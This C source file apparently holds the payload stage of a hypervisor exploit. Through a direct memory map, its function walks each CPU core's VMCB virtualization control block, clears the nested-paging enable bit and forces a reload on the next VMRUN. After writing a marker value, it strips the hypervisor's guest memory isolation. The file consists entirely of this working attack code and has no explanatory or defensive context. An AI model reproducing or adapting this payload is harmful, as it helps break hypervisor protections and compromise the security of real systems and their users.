#include <stdint.h>

#define VMCB_NESTED_CTRL    0x90
#define VMCB_CLEAN          0xC0

#define read64(p)           (*(volatile uint64_t *) (uint64_t) (p))
#define write64(p, v)       (*(volatile uint64_t *) (uint64_t) (p) = (uint64_t) (v))
#define write32(p, v)       (*(volatile uint32_t *) (uint64_t) (p) = (uint32_t) (v))

void vmcb_disable_np(uint64_t *param)
{
  uint64_t dmap        = param[1];
  uint64_t hv_heap_off = param[4];
  uint64_t pcpus       = param[5];

  write64(param[2], 0xcafedead00001337ULL);

  uint64_t heap = read64(dmap + hv_heap_off);

  for (int core = 0; core < 16; core++) {
    uint64_t pcpu = read64(dmap + pcpus + (uint64_t) core * sizeof(uint64_t));
    if (!pcpu) {
      continue;
    }
    uint64_t vmcb = read64(dmap + (pcpu - heap) + 0xa8);
    if (!vmcb) {
      continue;
    }

    uint64_t vpa = vmcb - heap;
    uint64_t old = read64(dmap + vpa + VMCB_NESTED_CTRL);

    write64(dmap + vpa + VMCB_NESTED_CTRL, old & ~1);               // disable nested paging
    write32(dmap + vpa + VMCB_CLEAN, 0);                            // force reload on next VMRUN
  }
}
